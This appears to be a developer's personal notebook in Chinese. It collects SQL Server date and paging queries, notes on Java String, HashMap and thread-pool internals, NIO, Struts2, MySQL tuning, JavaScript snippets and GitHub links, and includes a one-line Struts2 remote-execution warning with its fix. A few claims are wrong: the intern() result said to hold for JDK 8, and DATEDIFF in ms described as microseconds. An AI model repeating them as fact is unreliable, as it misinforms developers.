select stddev(id) from test_user
--------------------------------------------------------------------------------------
http://blog.jobbole.com/70549/ 傅立叶
--------------------------------------------------------------------------------------
sql server递归查询
--- cte查询
with tree(id,pid,name,lev) as
(
select id,pid,name,lev from test where id= 'a' --当前id
union all
select a.id,a.pid,a.name,a.lev from test  a
inner join tree  b on a.pid=b.id where a.lev <= 4 --级别范围，当前所在级别计算得出
)
select * from tree ;

SELECT CONVERT(DECIMAL(5,1), DATEDIFF(SECOND, '09:00', '09:20')/3600.0)

sql server2005分页
select top 10 *
from
(
 select row_number() over(order by id) as rownumber,* from test
) A
where rownumber > 40

select *
  from (select top(@pagesize * @pageindex)
         row_number() over(order by dbo.products.unitprice desc) as rownum,
               *
          from dbo.products) as temp
 where temp.rownum > (@pagesize * (@pageindex - 1))
 order by temp.unitprice

select  *
from    dbo.products
where   productid in (
        select top ( @pagesize )
                productid
        from    dbo.products
        where   productid not in ( select top ( @pagesize * (@pageindex-1) )
                                            productid
                                   from     dbo.products
                                   order by unitprice desc )
        order by dbo.products.unitprice desc )
order by dbo.products.unitprice asc


sql server 2012
select lastname, firstname, emailaddress
  from employee
 order by lastname,
          firstname,
          emailaddress
offset 14000 rows fetch next 50 rows only;

select convert(varchar(100), getdate(), 120): 2015-07-29 10:57:49 yyyy-mm-dd hh:mi:ss(24h)
select convert(varchar(100), getdate(), 23): 2015-07-29
select convert(varchar(100), getdate(), 24): 10:57:47
select convert(varchar(100), getdate(), 112): 20150729

返回指定日期中指定部分字符串值的函数DATENAME(datepart,date)
SELECT DATENAME(YEAR,'2014-3-15 10:23:45')

datepart 返回代表指定日期的指定日期部分的整数
SELECT DATEPART(month, '2004-10-15')  --返回 10

获取天数的函数DAY(d)
select DAY(‘2015-04-30 01:01:01’); 30
SELECT MONTH(‘2015-04-30’) AS monthValue; 4

SELECT datediff(day,'2008-12-29','2008-12-30') AS DiffDate 1

当天
datediff(day,createdate,GetDate())=0

一个月第一天的
Select DATEADD(mm, DATEDIFF(mm,0,getdate()), 0)
一年的第一天
Select DATEADD(yy, DATEDIFF(yy,0,getdate()), 0)
季度的第一天
SELECT DATEADD(qq, DATEDIFF(qq,0,getdate()), 0)

Sql Server中时间是精确到3毫秒

上个月的最后一天
Select dateadd(ms,-3,DATEADD(mm, DATEDIFF(mm,0,getdate()), 0))
本月的第一天
SELECT dateadd(mm, DATEDIFF(m,0,getdate()), 0)
本月的最后一天
Select dateadd(ms,-3,DATEADD(mm, DATEDIFF(m,0,getdate())+1, 0))
去年的最后一天
Select dateadd(ms,-3,DATEADD(yy, DATEDIFF(yy,0,getdate()), 0))
本年的最后一天
Select dateadd(ms,-3,DATEADD(yy, DATEDIFF(yy,0,getdate())+1, 0))

精简算法，’1989-12-31′ 用-1代替

DATEADD(DD,-1,@Date) AS '前一天'
,DATEADD(DD,1,@Date) AS '后一天'
,DATEADD(MONTH,DATEDIFF(MONTH,0,@Date),0) AS '月初'--在SQL Server中0 代表1900-01-01
,DATEADD(DD,-1,DATEADD(MONTH,1+DATEDIFF(MONTH,0,@Date),0)) AS '月末(精确到天)'
,DATEADD(MONTH,DATEDIFF(MONTH,0,@Date)-1,0) AS '上月第一天'
,DATEADD(DAY,-1,DATEADD(DAY,1-DATEPART(DAY,@Date),@Date)) AS '上月最后一天'
,DATEADD(MONTH,DATEDIFF(MONTH,0,@Date)+1,0) AS '下月第一天'
,DATEADD(DAY,-1,DATEADD(MONTH,2,DATEADD(DAY,1-DATEPART(DAY,@Date),@Date)))  AS '下月最后一天'
,DATEADD(YEAR,DATEDIFF(YEAR,0,@Date),0) AS '年初'
,DATEADD(YEAR,DATEDIFF(YEAR,-1,@Date),-1) AS '年末'
,DATEADD(YEAR,DATEDIFF(YEAR,-0,@Date)-1,0) AS '去年年初'
,DATEADD(YEAR,DATEDIFF(YEAR,-0,@Date),-1) AS '去年年末'
,DATEADD(YEAR,1+DATEDIFF(YEAR,0,@Date),0) AS '明年年初'
,DATEADD(YEAR,1+DATEDIFF(YEAR,-1,@Date),-1) AS '明年年末'

select DateDiff(ms,'2005-07-20','2005-7-25 22:56:32') --返回值为 微秒
select DatePart('yyyy','2005-7-25 22:56:32')--返回值为 2005

millisecond	ms

SELECT CONVERT(VARCHAR(100), GETDATE(), 20)	2010-03-06 16:25:04

select left(REPLACE(REPLACE(REPLACE(CONVERT(VARCHAR(100), GETDATE(), 20), '-', ''), ' ', ''), ':', ''), 12)
--返回 '201402131244'

select replace(replace(replace(CONVERT(varchar, getdate(), 120 ),'-',''),' ',''),':','')
20060512110608
--------------------------------------------------------------------------------------
查看系统监听的服务
l表示显示当前系统监听的端口信息；n表示端口按照端口号来显示
netstat -ln

下载sz中的s意为send（发送） send to cilent，就等同于客户端在下载
上传rz中的r意为received（接收）
--------------------------------------------------------------------------------------
AbstractStringBuilder 抽象类
abstract class AbstractStringBuilder implements Appendable, CharSequence

StringBuilder 默认16
StringBuffer  默认16 线程安全  继承AbstractStringBuilder

AbstractStringBuilder中采用一个char数组来保存需要append的字符串，
char数组有一个初始大小，当append的字符串长度超过当前char数组容量时，
则对char数组进行动态扩展2倍，也即重新申请一段更大的内存空间，然后将当前char数组拷贝到新的位置，

--------------------------------------------------------------------------------------
String是不可变的对象，每次对String进行操作的时候，都会生成一个新的对象
String类其实是通过char数组来保存字符串的
对String对象的任何改变都不影响到原对象，相关的任何change操作都会生成新的对象

String使用'+'进行字符串拼接时，在编译期会转化为StringBuilder#append方式
+XX:+OptimizeStringConcat,1.7默认打开 提高字符串拼接的性能

String在内存中有一个常量池，两个相同的串在池中只有一份实例(String s = "abc"方式或者String#intern方式会在池中分配)，
使用new String方式会在heap中分配，每次创建都是一个全新的实例

stringbuffer append操作是在原有对象的基础上进行的
当使用 append 或 insert 方法向源字符串追加内容的时候, 如果内部缓冲区的大小不够, 就会自动扩张容量
char[] value;

--------------------------------------------------------------------------------------
字符串常量 常量池
只包含常量的字符串连接符如"aa" + “aa"创建的也是常量
new String(“”)创建的对象会存储到heap中
使用包含变量的字符串连接符如"aa" + s1创建的对象是运行期才创建的,存储在heap中.

jdk1.6 常量池 持久代(永久代)
jdk1.7 分配堆 类的静态变量(class statics)转移到了java heap
JDK1.8移除永久区，元空间

String s = new String("1");
s.intern();
String s2 = "1";
System.out.println(s == s2);

String s3 = new String("1") + new String("1");
s3.intern();
String s4 = "11";
System.out.println(s3 == s4);
jdk6 8 下false false

元空间并不在虚拟机中，而是使用本地内存
--------------------------------------------------------------------------------------
栈(Stack) ：存放基本类型的变量数据和对象的引用，但对象本身不存放在栈中，
而是存放在堆（new 出来的对象）或者常量池中（字符串常量对象存放在常量池中）

堆(heap)：存放所有new出来的对象
常量池(constant pool)：在堆中分配出来的一块存储区域
另外，可以存储不经常改变的东西(public static final)常量池中的数据可以共享

String   c=new   String("xyz");
"xyz"被作为常量读入，在常量池(constant pool)里创建了一个共享的值为"xyz"的String对象；
然后当调用到new String("xyz")的时候，会在堆(heap)里创建这个new   String("xyz")对象;
--------------------------------------------------------------------------------------
基本数据类型 栈
包装类 堆
数组 在栈内存中创建一个数组引用 数据在堆内存中
final不影响变量的存储种类
被static修饰的变量是静态变量 方法区

java中基本类型的包装类的大部分都实现了常量池技术
即Byte,Short,Integer,Long,Character,Boolean
这5种包装类默认创建了数值[-128，127]的相应类型的缓存数据

--------------------------------------------------------------------------------------
map
put函数
对key的hashCode()做hash，然后再计算index;
如果没碰撞直接放到bucket里；
如果碰撞了，以链表的形式存在buckets后；
如果碰撞导致链表过长(大于等于TREEIFY_THRESHOLD)，就把链表转换成红黑树；
如果节点已经存在就替换old value(保证key的唯一性)
如果bucket满了(超过load factor*current capacity)，就要resize

map
get函数
bucket里的第一个节点，直接命中；
如果有冲突，则通过key.equals(k)去查找对应的entry
若为树，则在树中通过key.equals(k)查找，O(logn)；
若为链表，则在链表中通过key.equals(k)查找，O(n)

static final int hash(Object key) {
       int h;
       return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
高16bit不变，低16bit和高16bit做了一个异或

resize
在resize的过程，简单的说就是把bucket扩充为2倍，之后重新计算index，把节点再放到新的bucket中

当length总是2的n次方时，h& (length-1)运算等价于对length取模，也就是h%length，但是&比%具有更高的效率
http://yikun.github.io/2015/04/01/Java-HashMap%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/
--------------------------------------------------------------------------------------
Executor 框架包括：线程池，Executor，Executors，ExecutorService，CompletionService，Future，Callable

ThreadPoolExecutor
public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit,
    BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler);
keepAliveTime - 当线程数大于核心时，此为终止前多余的空闲线程等待新任务的最长时间

Executor:接口  void execute(Runnable command)
Executors：类 创先线程池 返回的线程池都实现了 ExecutorService 接口
ExecutorService:接口 继承Executor 关闭线程池 submit(Future)
CompletionService 接口

shutDown
线程池的状态则立刻变成SHUTDOWN状态
不能再往线程池中添加任何任务 直到添加到线程池中的任务都已经处理完成，才会退出

shutdownNow
线程池的状态立刻变成STOP状态
试图停止所有正在执行的线程，不再处理还在池队列中等待的任务
通过调用Thread.interrupt()方法

ExecutorService executor = Executors.newCachedThreadPool();
CompletionService<Integer> comp = new ExecutorCompletionService<>(executor);
for(int i = 0; i<5; i++) {
    comp.submit(new Task());
}
executor.shutdown();
int count = 0, index = 1;
while(count<5) {
   //poll()是非阻塞的 take()是阻塞的
   Future<Integer> f = comp.poll();
   if(f == null) {
        System.out.println(index + " 没发现有完成的任务");
   }else {
        System.out.println(index + "产生了一个随机数: " + f.get());
        count++;
        }
    index++;
    TimeUnit.MILLISECONDS.sleep(500);
}

排队策略
a. 直接提交
新进任务直接提交给线程池，当线程池中没有空闲线程时，创建一个新的线程处理此任务
直接提交通常要求无界 maximumPoolSizes 以避免拒绝新提交的任务
这种策略需要线程池具有无限增长的可能性实现为：SynchronousQueue
此策略可以避免在处理可能具有内部依赖性的请求集时出现锁

SynchronousQueue：同步的阻塞队列 SynchronousQueue没有任何容量
每个插入操作必须等待另一个线程的对应移除操作，等待过程一直处于阻塞状态

Executors.newCachedThreadPool
SynchronousQueue，这个线程池根据需要（新任务到来时）创建新的线程

b. 有界队列当线程池中线程达到corePoolSize时，新进任务被放在队列里排队等待处理
有界队列（如ArrayBlockingQueue 先进先出）有助于防止资源耗尽


c. 无界队列使用无界队列（例如，不具有预定义容量的 LinkedBlockingQueue）
创建的线程就不会超过 corePoolSize
将导致在所有 corePoolSize 线程都忙时新任务在队列中等待,创建的线程就不会超过 corePoolSize
public LinkedBlockingQueue() {
        this(Integer.MAX_VALUE);
}

饱和策略 ThreadPoolExecutor
AbortPolicy，即中止策略，是默认的饱和策略，该策略将抛出未检查的RejectedExecutionException
DiscardPolicy，即抛弃策略，会丢弃队列满后请求的任务
DiscardOldestPolicy，即抛弃最旧的策略，会抛弃下一个将要被执行的任务，然后尝试重新提交新任务
CallerRunsPolicy，即调用者策略 将任务回退到调用者

public static ExecutorService newSingleThreadExecutor() {
        return new FinalizableDelegatedExecutorService
            (new ThreadPoolExecutor(1, 1,
                                    0L, TimeUnit.MILLISECONDS,
                                    new LinkedBlockingQueue<Runnable>()));
}

public static ExecutorService newFixedThreadPool(int nThreads) {
        return new ThreadPoolExecutor(nThreads, nThreads,
                                      0L, TimeUnit.MILLISECONDS,
                                      new LinkedBlockingQueue<Runnable>());
}

无界线程
public static ExecutorService newCachedThreadPool() {
        return new ThreadPoolExecutor(0, Integer.MAX_VALUE,
                                      60L, TimeUnit.SECONDS,
                                      new SynchronousQueue<Runnable>());
}

public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) {
       return new ScheduledThreadPoolExecutor(corePoolSize);
}

public class ScheduledThreadPoolExecutor
        extends ThreadPoolExecutor
        implements ScheduledExecutorService

如果当前线程池中的线程数目小于corePoolSize，则每来一个任务，就会创建一个线程去执行这个任务；
如果当前线程池中的线程数目>=corePoolSize，则每来一个任务，会尝试将其添加到任务缓存队列当中，若添加成功，则该任务会等待空闲线程将其取出去执行；若添加失败（一般来说是任务缓存队列已满），则会尝试创建新的线程去执行这个任务；
如果当前线程池中的线程数目达到maximumPoolSize，则会采取任务拒绝策略进行处理
当线程池中的线程数大于corePoolSize时，如果一个线程空闲的时间达到keepAliveTime，则会终止，
直到线程池中的线程数不超过corePoolSize但是如果调用了allowCoreThreadTimeOut(boolean)方法，
在线程池中的线程数不大于corePoolSize时，keepAliveTime参数也会起作用，直到线程池中的线程数为0
--------------------------------------------------------------------------------------
<!-- 线程执行器配置，用于任务注册  -->
<bean id="executor" class="org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor">
    <property name="corePoolSize" value="6" />
    <property name="maxPoolSize" value="16" />
    <property name="queueCapacity" value="500" />
</bean>
创建了一个大小为500的LinkedBlockingQueue作为任务队列

Quartz 调度器以多线程的方式执行调度任务JobDetail,最大线程池大小为maxPoolSize，
若调度器中已有maxPoolSize个Job在工作（线程没有结束），那么即使有JobDetail到了被触发的时间，新的JobDetail不会被执行

--------------------------------------------------------------------------------------

先变量再字段
变量之间, 从左到右
字段之间, 并行执行

UPDATE DT_xms_salebill_daily
SET
saleprice = (case when mediatype = 2 then ? else ? end )
WHERE companyname = ?

UPDATE DT_xms_salebill_daily
SET saleamount = (salprice * feenum)
WHERE companyname = ?
--------------------------------------------------------------------------------------
PriorityBlockingQueue：基于优先级的无界阻塞队列
优先级队列不允许使用 null 元素依靠自然顺序的优先级队列还不允许插入不可比较的对象

BlockingQueue
LinkedBlockingQueue
ArrayBlockingQueue
SynchronousQueue
PriorityBlockingQueue
--------------------------------------------------------------------------------------
java nio
Channels and Buffers（通道和缓冲区）
基于通道（Channel）和缓冲区（Buffer）进行操作，数据总是从通道读取到缓冲区中，或者从缓冲区写入到通道中
缓冲区对象本质上是一个数组
所有的缓冲区类型都继承于抽象类Buffer，最常用的就是ByteBuffer
IntBuffer buffer = IntBuffer.allocate(8);
for (int i = 0; i < buffer.capacity(); ++i) {
    int j = 2 * (i + 1);
    // 将给定整数写入此缓冲区的当前位置，当前位置递增
    buffer.put(j);
}

// 重设此缓冲区，将限制设置为当前位置，然后将当前位置设置为0
buffer.flip();

// 查看在当前位置和限制位置之间是否有元素
while (buffer.hasRemaining()) {
    // 读取此缓冲区当前位置的整数，然后当前位置递增
    int j = buffer.get();
    System.out.print(j + "  ");
}

1. 从FileInputStream获取Channel
2. 创建Buffer
3. 将数据从Channel读取到Buffer中
FileInputStream fin = new FileInputStream("c:\\test.txt");
// 获取通道
FileChannel fc = fin.getChannel();
// 创建缓冲区
ByteBuffer buffer = ByteBuffer.allocate(1024);
// 读取数据到缓冲区
fc.read(buffer);
buffer.flip();
while (buffer.remaining()>0) {
    byte b = buffer.get();
    System.out.print(((char)b));
}
fin.close();

选择器（Selector）
Selector(选择器)：Selector类提供了监控一个和多个通道当前状态的机制
只要Channel向Selector注册了某种特定的事件，Selector就会监听这些事件是否会发生，
一旦发生某个事件，便会通知对应的Channel
使用选择器，借助单一线程，就可对数量庞大的活动I/O通道实施监控和维护

非阻塞IO
采用了基于Reactor模式的工作方式 实现非阻塞I/O的核心对象就是Selector

/*
 * 注册事件
 * */
protected Selector getSelector() throws IOException {
    // 创建Selector对象
    Selector sel = Selector.open();

    // 创建可选择通道，并配置为非阻塞模式
    ServerSocketChannel server = ServerSocketChannel.open();
    server.configureBlocking(false);

    // 绑定通道到指定端口
    ServerSocket socket = server.socket();
    InetSocketAddress address = new InetSocketAddress(port);
    socket.bind(address);

    // 向Selector中注册感兴趣的事件
    server.register(sel, SelectionKey.OP_ACCEPT);
    return sel;
}
/*
 * 开始监听
 * */
public void listen() {
    System.out.println("listen on " + port);
    try {
        while(true) {
            // 该调用会阻塞，直到至少有一个事件发生
            selector.select();
            Set<SelectionKey> keys = selector.selectedKeys();
            Iterator<SelectionKey> iter = keys.iterator();
            while (iter.hasNext()) {
                SelectionKey key = (SelectionKey) iter.next();
                iter.remove();
                process(key);
            }
        }
    } catch (IOException e) {
        e.printStackTrace();
    }
}
/*
 * 根据不同的事件做处理
 * */
protected void process(SelectionKey key) throws IOException{
    // 接收请求
    if (key.isAcceptable()) {
        ServerSocketChannel server = (ServerSocketChannel) key.channel();
        SocketChannel channel = server.accept();
        channel.configureBlocking(false);
        channel.register(selector, SelectionKey.OP_READ);
    }
    // 读信息
    else if (key.isReadable()) {
        SocketChannel channel = (SocketChannel) key.channel();
        int count = channel.read(buffer);
        if (count > 0) {
            buffer.flip();
            CharBuffer charBuffer = decoder.decode(buffer);
            name = charBuffer.toString();
            SelectionKey sKey = channel.register(selector, SelectionKey.OP_WRITE);
            sKey.attach(name);
        } else {
            channel.close();
        }
        buffer.clear();
    }
    // 写事件
    else if (key.isWritable()) {
        SocketChannel channel = (SocketChannel) key.channel();
        String name = (String) key.attachment();

        ByteBuffer block = encoder.encode(CharBuffer.wrap("Hello " + name));
        if(block != null)
        {
            channel.write(block);
        }
        else
        {
            channel.close();
        }

     }
}
--------------------------------------------------------------------------------------
缓冲区分片
子缓冲区相当于是现有缓冲区的一个视图窗口调用slice()方法可以创建一个子缓冲区
// 创建子缓冲区
buffer.position( 3 );
buffer.limit( 7 );
ByteBuffer slice = buffer.slice();

只读缓冲区
ByteBuffer buffer = ByteBuffer.allocate( 10 );
// 创建只读缓冲区
ByteBuffer readonly = buffer.asReadOnlyBuffer();
改变原缓冲区的内容 只读缓冲区的内容也随之改变

只可以把常规缓冲区转换为只读缓冲区，而不能将只读的缓冲区转换为可写的缓冲区

直接缓冲区 避免将缓冲区的内容拷贝到一个中间缓冲区中 或者从一个中间缓冲区中拷贝数据
ByteBuffer buffer = ByteBuffer.allocateDirect(1024);

内存映射文件I/O
RandomAccessFile raf = new RandomAccessFile( "c:\\test.txt", "rw" );
FileChannel fc = raf.getChannel();
MappedByteBuffer buffer = fc.map(FileChannel.MapMode.READ_ONLY, 0, fileChannel.size());

Java nio通过使用虚拟内存技术将文件系统中的文件页和应用程序空间直接对应起来
--------------------------------------------------------------------------------------
ArrayList
底层使用数组实现
LinkedList
双向链表 基于链表 implements List<E>, Deque<E> 包含了first和last两个指针
判断index是在前半区间还是后半区间，如果在前半区间就从head搜索，而在后半区间就从tail搜索

--------------------------------------------------------------------------------------
CountDownLatch用于处理一个或多个线程等待其他所有线程完毕之后再继续进行操作
CyclicBarrier用于N个线程相互等待，当到达条件之后所有线程继续执行

CountDownLatch用完之后就不能再次使用了，CyclicBarrier用完之后可以再次使用，CyclicBarrier还可以做reset操作
CountDownLatch底层使用的是共享锁，CyclicBarrier底层使用的是ReentrantLock
Semaphore底层也是使用共享锁实现的
--------------------------------------------------------------------------------------
struts2 漏洞
开启动态方法调用的情况下可以远程执行任意命令
修改 Struts2 的配置文件，将“struts.enable.DynamicMethodInvocation” 设置为 false，如
<constant name="struts.enable.DynamicMethodInvocation" value="false" />；

--------------------------------------------------------------------------------------
Struts2中通过使用拦截器来实现的 token拦截器和tokenSession拦截器
使用token拦截器重复提交表单的时候，浏览器会跳转到一个错误页面，
而使用更tokenSession拦截器重复提交表单的话是不会跳转的，仍然在成功之后页面。
使用者两个拦截器重复提交表单的时候，都只会向服务器提交一次请求，所以这种方式可以有效降低服务器的负担

<!-- 避免表单重复提交 -->
<action name="token" class="action.TokenAction">
    <!-- 配置Token拦截器 -->
    <interceptor-ref name="defaultStack"></interceptor-ref>
    <interceptor-ref name="token"></interceptor-ref>
    <!-- 如果重复提交，则跳转到error.jsp -->
    <result name="invalid.token">/error.jsp</result>
    <result>/success.jsp</result>
</action>

<action name="tokenSession" class="action.TokenAction">
    <!-- 配置TokenSession拦截器 -->
    <interceptor-ref name="defaultStack"></interceptor-ref>
    <interceptor-ref name="tokenSession"></interceptor-ref>
    <!-- 如果重复提交，则跳转到error.jsp -->
    <result name="invalid.token">/error.jsp</result>
    <result>/success.jsp</result>
</action>

显示等待页面 execAndWait拦截器
execAndWait拦截器能够让一个A执行时间超过5分钟的Action在后台运行，并向用户显示一个等待页面

execAndWait拦截器有以下几个参数：
threadPriority：执行线程的优先级
delay：指定在显示等待页面前初始的延迟加载时间，单位是毫秒
delaySleepInternal：指定检查后台线程是否执行完毕的时间间隔，必须和delay参数一起使用，
单位是毫秒，默认是100毫秒。表示每100毫秒进行一次检查

--------------------------------------------------------------------------------------
Struts2框架的核心控制器是StrutsPrepareAndExecuteFilter
负责拦截由<url-pattern>/*</url-pattern>指定的所有用户请求
--------------------------------------------------------------------------------------
object中定义了哪些方法？
clone(), equals(), hashCode(), toString(), notify(), notifyAll(), wait(), finalize(), getClass()
--------------------------------------------------------------------------------------
Spring自定义标签
extends NamespaceHandlerSupport
extends AbstractSingleBeanDefinitionParser
--------------------------------------------------------------------------------------
限制总并发数（比如数据库连接池、线程池）、
限制瞬时并发数（如nginx的limit_conn模块，用来限制瞬时并发连接数）、
限制时间窗口内的平均速率（如Guava的RateLimiter、nginx的limit_req模块，限制每秒的平均速率）
--------------------------------------------------------------------------------------
应用级限流
限流总并发/连接/请求数
对于一个应用系统来说一定会有极限并发/请求数，即总有一个TPS/QPS阀值，如果超了阀值则系统就会不响应用户请求或响应的非常慢，因此我们最好进行过载保护，防止大量请求涌入击垮系统。
如果你使用过Tomcat，其Connector 其中一种配置有如下几个参数：
acceptCount：如果Tomcat的线程都忙于响应，新来的连接会进入队列排队，如果超出排队大小，则拒绝连接；
maxConnections： 瞬时最大连接数，超出的会排队等待；
maxThreads：Tomcat能启动用来处理请求的最大线程数，如果请求处理量一直远远大于最大线程数则可能会僵死。

限流总资源数
连接池、线程池

限流某个接口的总并发/请求数
try {
    if(atomic.incrementAndGet() > 限流数) {
        //拒绝请求
        //简单粗暴的限流，没有平滑处理
    }
    //处理请求
} finally {
    atomic.decrementAndGet();
}

平滑限流某个接口的请求数
Guava RateLimiter提供了令牌桶算法实现：平滑突发限流(SmoothBursty)和平滑预热限流(SmoothWarmingUp)实现

--------------------------------------------------------------------------------------
处理粘包或者分包的策略基本就两种：
1.每个数据前后加特殊字符，比如ftp方式，这样方式容易出错，如果数据本身含有特殊字符就会发生分隔错误
2.业务数据加业务协议头标识业务数据的长度，在读取的时候能够确定向后读取数据的长度作为一个业务数据的边界
--------------------------------------------------------------------------------------
var x=1;
var y=1;
method(8);
console.log('---->'+(x+y));  --5
function method(y)
{
   x+=3;
   y+=3;        参数y，这里仅仅是局部变量
   console.log(x+y); --15
}
--------------------------------------------------------------------------------------
-XX:CMSInitiatingOccupancyFraction=80 即老年代满80%时触发CMS(full gc)
--------------------------------------------------------------------------------------
https://github.com/lwhite1/tablesaw
https://github.com/kocherovms/metracer
https://github.com/selfly/dexcoder-assistant 快速开发辅助工具包
--------------------------------------------------------------------------------------
jps
-m 输出main method的参数
-v 输出jvm参数
jps -J-Djps.debug=true -J-Djps.printStackTrace=true
--------------------------------------------------------------------------------------
https://github.com/nicusX/akka-java8-examples
https://github.com/xuerong/hqrank
https://github.com/mgoellnitz/dinistiq/ 依赖注入
--------------------------------------------------------------------------------------
oracle按周分组 星期一为一周的第一天
select min(dt) monday, max(dt) sunday
  from (select level rn,
               trunc(to_date('2016-6', 'YYYY-MM'), 'mm') + level - 1 dt,
               max(decode(to_char(trunc(to_date('2016-6', 'YYYY-MM'), 'mm') +
                                  level - 1,
                                  'd'),
                          2,
                          level,
                          0)) over(order by level) flag
          from dual
        connect by level <= last_day(trunc(to_date('2016-6', 'YYYY-MM'))) -
                   trunc(to_date('2016-6', 'YYYY-MM'), 'mm') + 1)
 group by flag
 order by min(rn);

--------------------------------------------------------------------------------------
useServerPrepStmts=false&rewriteBatchedStatements=true
rewriteBatchedStatements=true，mysql默认关闭了batch处理，通过此参数进行打开
useServerPrepStmts=false  使用com.mysql.jdbc.PreparedStatement进行本地SQL拼装
--------------------------------------------------------------------------------------
http://nutzam.com/
--------------------------------------------------------------------------------------
/**
     * emoji表情替换
     *
     * @param source 原字符串
     * @param slipStr emoji表情替换成的字符串
     * @return 过滤后的字符串
     */
public static String filterEmoji(String source,String slipStr) {
    if(StringUtils.isNotBlank(source)){
        return source.replaceAll("[\\ud800\\udc00-\\udbff\\udfff\\ud800-\\udfff]", slipStr);
    }else{
        return source;
    }
  }
--------------------------------------------------------------------------------------
tls加密设置
mail.smtp.starttls.enable = true
--------------------------------------------------------------------------------------
https://github.com/zhangCabbage/modelUtil
--------------------------------------------------------------------------------------
执行到bufferedimage.createGraphics();便停止不动了。最终在启动脚本增加
JAVA_OPTS="-Djava.awt.headless=true"解决问题
--------------------------------------------------------------------------------------
https://github.com/PatMartin/Dex java 数据可视化
https://github.com/shekhargulati/99-problems

--------------------------------------------------------------------------------------
https://github.com/agzamovr/CollectorEx java 8
--------------------------------------------------------------------------------------
ulimit -u是显示用户最多可开启的程序数目
--------------------------------------------------------------------------------------
oracle
设置的时候setTime（java.sql.Time）设置参数，getTimestamp取得字段值
java.sql.date-->date
java.sql.timestamp-->timestamp
java.sql.time--date

setTimestamp
setTime 快
--------------------------------------------------------------------------------------
eclipse eclipse.ini
 -Duser.language=en
--------------------------------------------------------------------------------------
https://github.com/wosyingjun/beauty_ssm
--------------------------------------------------------------------------------------
mysql
SHOW VARIABLES LIKE '%profil%'
SET profiling = 1;
....
show profile for query 1;
--------------------------------------------------------------------------------------
Hystrix的设计原则包括:
资源隔离
熔断器
命令模式
--------------------------------------------------------------------------------------
https://github.com/fabienrenaud/java-json-benchmark
--------------------------------------------------------------------------------------
https://github.com/shibing624/xmnlp 中文分词
--------------------------------------------------------------------------------------
https://github.com/kiprobinson/BigFraction
https://github.com/fuinorg/objects4j
--------------------------------------------------------------------------------------
str= str.trim();
str = str.replaceAll("\\u00A0", "");
str = str.replaceAll("\\u0020 ", "");
str = str.replaceAll("\\u3000", "");
--------------------------------------------------------------------------------------
弹出遮罩层，阻止背景滚动
设置body的CSS样式为overflow:hidden
--------------------------------------------------------------------------------------
div之只有垂直滚动条
overflow-y: auto;
overflow-x:hidden;
--------------------------------------------------------------------------------------
function convertHTML(str) {
  var pattern=/[&<>"']/g;
  rules={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&apos;"};
 return str.replace(pattern,function(match){
    return  rules[match];
  });
}
--------------------------------------------------------------------------------------
https://github.com/gundy/semver4j 版本比较
https://github.com/filipvanlaenen/jCRK java哈希碰撞
https://github.com/brettonw/Bag

--------------------------------------------------------------------------------------
input1 = '0281234567';
input2 = '0282345678';
var reg = /^\d+$/g;
reg.test(input1);  //true
reg.test(input2);  //false

/g代表全局匹配,所以判断正则时内部是有一个lastIndex来记录最后匹配的位置.当重复调用的时候,会接着上次的lastIndex继续匹配
reg.lastIndex=0
--------------------------------------------------------------------------------------
https://github.com/ftlabs/fastclick 前端快速点击(无延迟)
--------------------------------------------------------------------------------------
<th nowrap="nowrap"> 不换行
$("input:radio[name='dialCheckResult']").eq(0).attr("checked",true);
$("input:radio:not([checked])").attr("disabled","disabled");
--------------------------------------------------------------------------------------
border-bottom: 1px dashed #000;
--------------------------------------------------------------------------------------
Mysql
触发器是以解释型代码的方式保存的。MySQL 不会预编译这些代码。 会在每次的事务空间中被调用
触发锁创建或销毁时所需要的元数据锁

http://www.tuicool.com/articles/YnUVnyJ  gh-ost无触发器修改表
--------------------------------------------------------------------------------------
back_log：
在MySQL暂时停止回答新请求之前的短时间内多少个请求可以被存在堆栈中。
如果MySql的连接数据达到max_connections时，新来的请求将会被存在堆栈中，以等待某一连接释放资源

--------------------------------------------------------------------------------------
mysql表分区
explain partitions select count(1) from user_partition where id in (1,2,3,4,5);

分区的限制和缺点：
一个表最多只能有1024个分区
如果分区字段中有主键或者唯一索引的列，那么所有主键列和唯一索引列都必须包含进来
分区表无法使用外键约束
NULL值会使分区过滤无效
所有分区必须使用相同的存储引擎

--------------------------------------------------------------------------------------
多次查询不具备原子性
SELECT
 *
FROM
 (SELECT
 a.*,
 (CASE a.type
 WHEN @t THEN @r:=@r + 1
 ELSE @t:=a.type
 END) AS rank
 FROM
 (SELECT * FROM log order by id desc limit 10000) a, (SELECT @r:=1, @t = 0) b
 ORDER BY type, id desc ) c
where rank < 3
--------------------------------------------------------------------------------------
JDBC连接串zeroDateTimeBehavior属性有下列三个属性值：
1> exception：默认值，即抛出SQL state [S1009]. Cannot convert value....的异常；
2> convertToNull：将日期转换成NULL值；
3> round：替换成最近的日期即0001-01-01；
--------------------------------------------------------------------------------------
使用VARBINARY存储变长字符串
--------------------------------------------------------------------------------------
缓存区大小由参数read_rnd_buffer_size控制，然后有序去捞记录，将随机IO转为顺序IO
sort_buffer_size
参数max_length_for_sort_data，只有当排序元组小于max_length_for_sort_data时，
才能利用优化排序方式，否则只能用常规排序方式(代价内存大)

优化的排序方式相对于常规排序，减少了第二次IO

mysql5.6 优先队列 堆排序实现
--------------------------------------------------------------------------------------
js正则
正则表达式没有定义捕获组的情况下，默认为三个参数，分别为：matched（匹配子串），匹配下标，原串(originalText)。
否则，第2至n个参数对应为捕获组匹配项，倒数的两个参数为：匹配下标，原串(originalText)

--------------------------------------------------------------------------------------
已知格式化日期的字符串和格式化后的日期，还原日期
var getDateFromFormat=function(date,format){
         result={year:0,month:0,day:0};//当然这里可以默认1970-1-1日
         if(date){
              format.replace(/y+|Y+|M+|d+|D+/g,function(m,a,b){//这里只做了年月日  加时分秒也是可以的
                       date.substring(a).replace(/\d+/,function(d){c=parseInt(d,10)});
                       if(/y+/i.test(m)&&!result.year)result.year=c;
                       if(/M+/.test(m)&&!result.month)result.month=c;
                       if(/d+/i.test(m)&&!result.day)result.day=c;
               });
          }
         return result;
    };
getDateFromFormat("2011-11-12","YYYY-MM-DD");
